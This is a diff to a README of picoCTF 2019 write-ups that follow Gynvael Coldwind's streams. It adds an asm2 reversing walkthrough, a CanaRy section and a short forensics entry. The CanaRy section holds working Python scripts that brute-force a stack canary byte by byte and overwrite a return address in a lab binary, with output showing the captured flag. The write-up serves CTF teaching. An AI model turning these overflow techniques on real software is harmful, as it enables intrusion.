@@ -58,7 +58,13 @@ Title                                                                      | Cat
 [Irish-Name-Repo 1           ](#irish-name-repo-1---web-exploitation)      | Web              | 300    | [Part 3 (1:38:26)](https://youtu.be/3x4nzymm33Q?t=1h38m26s)
 [flag_shop                   ](#flag_shop---general-skills)                | General          | 300    | [Part 3 (1:48:23)](https://youtu.be/3x4nzymm33Q?t=1h48m23s)
 [asm1                        ](#asm1---reverse-engineering)                | Reversing        | 200    | [Part 3 (2:02:44)](https://youtu.be/3x4nzymm33Q?t=2h02m44s)
+[New Overflow-2              ](#newoverflow-2---binary-exploitation)       | Binary           | 250    | [Part 4 (25:45)](https://youtu.be/gEPd1ref9s0?t=25m45s)
+[asm2                        ](#asm2---reverse-engineering)                | Reversing        | 250    | [Part 4 (52:41)](https://youtu.be/gEPd1ref9s0?t=52m41s)
+[CanaRy                      ](#canary---binary-exploitation)              | Binary           | 300    | [Part 4 (1:07:25)](https://youtu.be/gEPd1ref9s0?t=1h07m25s)
+[Investigative Reversing 0   ](#investigative-reversing-0---forensics)     | Forensics        | 300    | [Part 4 (1:57:03)](https://youtu.be/gEPd1ref9s0?t=1h57m03s)
 
+## Note:
+If you're following along with your own picoctf account and solving challenges, not all values in the writeups will be the same as yours. For example, the last few characters of the flags are randomized, problem paths in the shell server are different for each user, and for the asm reversing problems, the values you get are different.
 
 ## Credits
 All the credit goes to [Gynvael Coldwind](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg) for making these streams. Check him out.  
@@ -156,7 +162,7 @@ In main(), this line runs the input
 ((void (*)())buf)();
 ```
 
-If we just run the program and put in random input like asdf, the program will crash since asdf aren't valid instruction that can be executed
+If we just run the program and put in input like asdf, the program will crash since asdf aren't valid instruction that can be executed
 ```console
 $ ./vuln
 Enter your shellcode:
@@ -911,7 +917,7 @@ vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), stat
 ```
 32-bit shellcode
 
-You could use random shellcode from the internet or create your own. Gynvael decides to write his own custom shellcode for fun using fopen/fgets.
+You could use some shellcode from the internet or create your own. Gynvael decides to write his own custom shellcode for fun using fopen/fgets.
 
 Open the binary in IDA or Ghidra or objdump to find the addresses of the functions.  
 
@@ -940,7 +946,7 @@ n1:
   ; push fgets parameters (LIFO order)
   push eax ; eax is where fopen stores the file ptr (3rd parameter of fgets)
   push 64  ; number of characteres to read (2nd parameter of fgets)
-  push 0x80DC11C ; this is a random address in memory Gynvael found to write our flag (use IDA, Ghidra, or objdump to find some blank memory)
+  push 0x80DC11C ; this is an address in memory Gynvael found to write our flag (use IDA, Ghidra, or objdump to find some blank memory)
 
   mov eax, 0x8052660 ; fgets address (Use IDA or Ghidra or objdump to find this)
   call eax
@@ -1091,7 +1097,7 @@ Opening in a text editor reveals some strings like RGB, gAMA, etc. which tells u
 
 Use Gynvael's brute zlib decompressor code at [https://github.com/gynvael/random-stuff/tree/master/brute_zlib]. This code will just try decompressing the zlib data in a png.  
 
-Just change `data, unused = DecompressStream(d[i:i+128])` to `data, unused = DecompressStream(d[i:i+1024000]) # Just change 128 to a random large number` since the mystery file is large. The png has a zlib marker so that when the decompression is done, the program will exit.
+Just change `data, unused = DecompressStream(d[i:i+128])` to `data, unused = DecompressStream(d[i:i+1024000]) # Just change 128 to a  large number` since the mystery file is large. The png has a zlib marker so that when the decompression is done, the program will exit.
 
 ```console
 $ python go.py ./mystery
@@ -1784,7 +1790,444 @@ Segmentation fault (core dumped)
 Some instructions need stack alignments of 16 bytes instead of 8 bytes, which is why we needed to add another 8 bytes in our exploit with the ret. 
 
 ## asm2 - Reverse Engineering
+In the last asm1 challenge, Gynvael just ran the program to find the flag; this time Gynvael actually analyzes the code and converts it to python.
 
+```assembly
+asm2:
+        <+0>:   push   ebp
+        <+1>:   mov    ebp,esp
+        <+3>:   sub    esp,0x10
+        <+6>:   mov    eax,DWORD PTR [ebp+0xc]
+        <+9>:   mov    DWORD PTR [ebp-0x4],eax
+        <+12>:  mov    eax,DWORD PTR [ebp+0x8]
+        <+15>:  mov    DWORD PTR [ebp-0x8],eax
+        <+18>:  jmp    0x50c <asm2+31>
+        <+20>:  add    DWORD PTR [ebp-0x4],0x1
+        <+24>:  add    DWORD PTR [ebp-0x8],0xaf
+        <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
+        <+38>:  jle    0x501 <asm2+20>
+        <+40>:  mov    eax,DWORD PTR [ebp-0x4]
+        <+43>:  leave
+        <+44>:  ret
+```
+
+Python translation:
+```python
+""" We know there are two arguments because of the problem description """
+def asm2(arg1, arg2):
+  """ Standard function prolouge: sets up the stack of the function """ 
+  # <+0>:   push   ebp            ; This saves the old ebp from the previous function, so that when we can revert back when we return
+  # <+1>:   mov    ebp,esp        ; Sets the new ebp
+  # <+3>:   sub    esp,0x10       ; Creates 0x10 or 16 bytes for local variables(s) 
+
+  """ The stack looks like this after the function prolouge:        """
+
+                                                                    """ 
+      [    A   ]                                                  
+      [    B   ]                                                  
+      [    C   ]                                                  
+      [    D   ]                                                  
+      [Old EBP ]   <-- EBP                                    
+      [  RET   ]                                                  
+      [  ARG1  ]                                                 
+      [  ARG2  ]
+                                                                    """                                                   
+  """ In the above stack, each [] represents 4 bytes. A, B, C, and D all represent local 4 byte variables since we know that that a total of 16 bytes were located for local variables. Right now we don't know how many actual variables there are, but we're just assuming there's four 4 byte vars right now. It could be sixteen 1 byte variables, but we don't know yet."""
+
+
+  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
+  eax = arg2
+
+  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
+  d = eax
+
+  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
+  eax = arg1
+
+  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
+  c = eax
+
+  # <+18>:  jmp    0x50c <asm2+31>
+
+
+  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
+  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
+  d +=1
+  c += 0xaf
+
+  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
+  # <+38>:  jle    0x501 <asm2+20>
+  if c <= 0xa3d3:
+    goto asm2+20
+
+  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
+  # <+43>:  leave
+  # <+44>:  ret
+  return d
+
+```
+
+There are no gotos in python, so turn the goto into a while loop and simplify a bit:
+```python
+def asm2(arg1, arg2):
+  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
+  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
+  d = arg2
+
+  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
+  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
+  c = arg1
+
+  # <+18>:  jmp    0x50c <asm2+31>
+  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
+  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
+  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
+  # <+38>:  jle    0x501 <asm2+20>
+  while c <= 0xa3d3:
+    d+=1
+    c+= 0xaf
+
+  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
+  # <+43>:  leave
+  # <+44>:  ret
+  return d
+
+```
+
+If we want to be even more accurate, we would account for the fact that x86 asm operates on 32 bit integers while python doesn't really have a limit on the size of integers. So we can truncate python's integers to 32 bits. We don't have to do this for this challenge since it probably won't matter.
+```python
+def asm2(arg1, arg2):
+  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
+  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
+  d = arg2
+
+  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
+  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
+  c = arg1
+
+  # <+18>:  jmp    0x50c <asm2+31>
+  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
+  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
+  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
+  # <+38>:  jle    0x501 <asm2+20>
+  while c <= 0xa3d3:
+    d = (d + 1) & 0xffffffff # Apply a mask to truncate to 32 bits
+    c = (c + 0xaf) & 0xffffffff # Apply a mask to truncate to 32 bits
+
+  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
+  # <+43>:  leave
+  # <+44>:  ret
+  return d
+```
+
+Now run the function with the provided arguments:
+```python
+def asm2(arg1, arg2):
+  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
+  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
+  d = arg2
+
+  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
+  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
+  c = arg1
+
+  # <+18>:  jmp    0x50c <asm2+31>
+  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
+  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
+  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
+  # <+38>:  jle    0x501 <asm2+20>
+  while c <= 0xa3d3:
+    d = (d + 1) & 0xffffffff # Apply a mask to truncate to 32 bits
+    c = (c + 0xaf) & 0xffffffff # Apply a mask to truncate to 32 bits
+
+  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
+  # <+43>:  leave
+  # <+44>:  ret
+  return d
+
+print(hex(asm2(0xc,0x15)))
+```
+
+```console
+$ python test.py
+0x105
+```
+
+This approach of translating into a higher level language is a standard way of reverse engineering.
+
+## CanaRy - Binary Exploitation
+A canary is just a random value on the stack in between the local variables and the return address. Thus if an attacker overwrites it by trying to overwrite the return address, the attacker will change the value of the canary and the program will exit immediately.  
+
+Reconissance:
+```console
+$ file vuln
+vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6cfe75e5f3db954bad5a09eb57527c5a0d727b8f, not stripped
+$ checksec --file=vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   vuln
+```
+No canary means that the program has a custom canary implementation. The program also has ASLR/PIE and NX enabled (non executable stack).
+
+Like every other binary challenge, code to make exploitation easier (no buffering stdout and makes sure priveleges aren't dropped)
+```c
+setvbuf(stdout, NULL, _IONBF, 0);
+
+int i;
+gid_t gid = getegid();
+setresgid(gid, gid, gid);
+```
+
+The read_canary() function:
+```c
+void read_canary() {
+  FILE *f = fopen("/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt","r");
+  if (f == NULL) {
+    printf("[ERROR]: Trying to Read Canary\n");
+    exit(0);
+  }
+  fread(key,sizeof(char),KEY_LEN,f);
+  fclose(f);
+}
+```
+Canary is read from a file called canary.txt and puts the canary in a global variable called key.
+
+```c
+#define KEY_LEN 4
+...
+char key[KEY_LEN];
+```
+We see that the key canary is only 4 bytes.
+
+There's a constant canary since the canary is read from a file which allows the canary to be bruteforced. Usually this isn't found in the wild except in fork servers where all the children processes have the same canary or in Windows XP's kernel.  
+
+Let's look at the vuln() function:
+```c
+...
+char canary[KEY_LEN];
+char buf[BUF_SIZE];
+char user_len[BUF_SIZE];
+...
+```
+This order of declaration means the stack looks like this:
+```
+[RETURN ADDRESSS]
+[ Old Saved EBP ]
+[ Canary Buffer ]
+[   Buf buffer  ]
+[user_len buffer]
+```
+
+```c
+...
+memcpy(canary,key,KEY_LEN);
+...
+```
+This copies the canary from `key` to `canary`. This is also usually how it work. The cananry is copied from a "master cookie" (stored in a hidden location) at the beginning of the function.  
+
+The following just reads a length from the user:
+```c
+while (x<BUF_SIZE) {
+      read(0,user_len+x,1);
+      if (user_len[x]=='\n') break;
+      x++;
+}
+sscanf(user_len,"%d",&count);
+```
+
+This reads user input, but it trusts the length we give. Since we control `count`, we can cause a buffer overflow.
+```c
+read(0,buf,count);
+```
+
+This just checks if the canary was overwritten:
+```c
+if (memcmp(canary,key,KEY_LEN)) {
+  printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
+  exit(-1);
+}
+```
+
+We want to jump to the flag after bypassing the canary:
+```c
+void display_flag() {
+  char buf[FLAG_LEN];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("'flag.txt' missing in the current directory!\n");
+    exit(0);
+  }
+  fgets(buf,FLAG_LEN,f);
+  puts(buf);
+  fflush(stdout);
+}
+```
+
+The way we attack the canary is brute force the canary one byte at a time. Instead of brute forcing 4 bytes or around 4 billion combinations (2^32), bruteforcing one byte at a time only has 256 (2^8) combinations per byte. We can just overwrite one byte of the canary at a time, and it we guess that byte correctly, we won't see the ```*** Stack Smashing Detected ***``` message. When we guess the first byte correctly, we can then use that first byte and then guess the second byte. Then when we guess the second byte correctly, we can guess the third and so on. Once we get the canary, we can overwrite the buffer, overwrite the canary with the right canary, overwrite some stuff in between the canary and return address, and then overwrite the return address with the address of display_flag().
+
+Gynvael uses IDA to make sure the buffer is right next to the canary in memory.
+
+Script to find canary:
+```python
+import subprocess
+
+def call(sz, t):
+  assert sz>=32
+  payload = ""
+  payload += "%i\n" % sz # size of our input
+  payload += "A" * 32 # To fill the buf buffer
+  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + '\n'
+
+  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
+  (stdout, stderror) = p.communicate(payload)
+
+  print stdout
+
+canary = [0, 0, 0, 0]
+
+call(33, canary) # Test the call function
+```
+
+Test the script locally:
+```console
+$ python go.py
+[ERROR]: Trying to Read Canary
+```
+
+The above error occurs because the binary is trying to open up the canary.txt file. Let's create it:
+```console
+$ echo -n ASDF > canary.txt
+```
+
+The error still occurs:
+```console
+$ python go.py
+[ERROR]: Trying to Read Canary
+```
+This is because the vuln binary has the path to canary.txt hard coded.
+
+Use a hex editor to change the hardcoded path (looks like `/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt`) to something like `canary.txt`. After patching the binary, the program will look for the canary.txt in the current directory.
+
+Now the script works:
+```console
+$ python go.py
+Please enter the length of the entry:
+> Input> *** Stack Smashing Detected *** : Canary Value Corrupt!
+```
+
+Now we have to use our script call() function to brute force the stack value.
+```python
+import subprocess
+
+def call(sz, t):
+  assert sz>=32
+  payload = ""
+  payload += "%i\n" % sz # size of our input
+  payload += "A" * 32 # To fill the buf buffer
+  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + '\n'
+
+  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
+  (stdout, stderror) = p.communicate(payload)
+
+  #print stdout
+  return "Stack Smashing Detected" not in stdout
+
+canary = [0, 0, 0, 0]
+
+for i in xrange(4):
+  for j in xrange(256):
+    canary[i] = j
+    if call(33 + i, canary):
+      print "%i" % j
+      break
+
+#call(33, canary) # Test the call function
+```
+
+The script works locally:
+```console
+$ python go.py
+65
+83
+68
+70
+```
+
+Testing on remote (make sure to change the path in the script):
+```console
+$ python ~/go.py
+51
+51
+120
+79
+```
+
+The four bytes of the canary on the remote are 51, 51, 120, 79.  
+
+With the canary value now figured out, we can now make the payload. We have to deal with ASLR. ASLR moves around memory pages, but not the contents. This means the lowest 3 nibbles (lowest 3 hex digits) of the addresses stays constant. 
+
+If we look at the address of display_flag() it says 0x000007ed (using IDA, Ghidra, or objdump). This means that the last few digits `7ed` will reman constant while the rest will change because of ASLR.
+
+```python
+import subprocess
+
+def call(sz, t, stuff=""):
+  assert sz>=32
+  payload = ""
+  payload += "%i\n" % sz # size of our input
+  payload += "A" * 32 # To fill the buf buffer
+  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + stuff + '\n'
+
+  p = subprocess.Popen(["/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
+  (stdout, stderror) = p.communicate(payload)
+
+  print stdout
+  return "Stack Smashing Detected" not in stdout
+
+canary = [51, 51, 120, 79] # Replace with the stack canary we got from the remote server
+payload = "A"*0x10 # Gynvael used IDA to see how many bytes were inbetween the canary and return address. It seems to be 0x10 or 16 bytes
+payload += chr(0xED) + chr(0x07) # We know that the last 3 nibbles of display_flag() are 0x7ed, so we know the last byte will be 0xED. We don't actually know that the penultimate byte is 0x07, we only know the '7' part, but if we run the script multiple times, eventually the address will hit a zero at that position. The higher bytes of display_flag() address will be the same as the address from main(). So we only need to overwrite the last two bytes of the return address.
+
+
+# Just execute the vuln program multiple times so that eventually we get the address of display_flag() right
+for i in xrange(32):
+  call(32 + 4 + 0x10 + 2, canary, payload) # 32 bytes for buffer + 4 bytes for canary + 0x10 bytes of stuff we don't care about + 2 bytes of the return address to overwrite
+
+```
+
+Now run the above script on the remote server
+```console
+user@pico-2019-shell1:/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0$ python ~/asdf.py
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+
+Please enter the length of the entry:
+> Input> Ok... Now Where's the Flag?
+picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
+```
+
+## Investigative Reversing 0 - Forensics
+We get a png and a binary. When we look at the png in a hex editor it looks like there's a flag at the end of it, although it's modified. Gynvael looks at the binary in IDA and sees that the binary appends the first 6 bytes of the flag to the png, appends the 9 next bytes after adding 5 to each of the chars, and then subtracts 3 to the next byte. Gynvael does the opposite operations on the hex to reverse what the binary did to get the flag.
 
 ## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
@@ -1793,6 +2236,7 @@ Some instructions need stack alignments of 16 bytes instead of 8 bytes, which is
 * For network dumps there are two main tools: Wireshark and NetworkMiner
 * Gynvael recommends working on ctf challenges remotely in most cases since in many cases an exploit could work locally but not remotely (like in the above case).
 * On 64-bit binary exploitation challenges, when passing parameters to functions, ROP is usually the way to get the proper values into registers.
+* calling exit() still means the destructors are still called. An attacker can use the destructor call to their advantage. Use \_exit instead with the underscore.
 
 ## TODO 
 * Fix all the weird non ascii apostrophes and double quotes
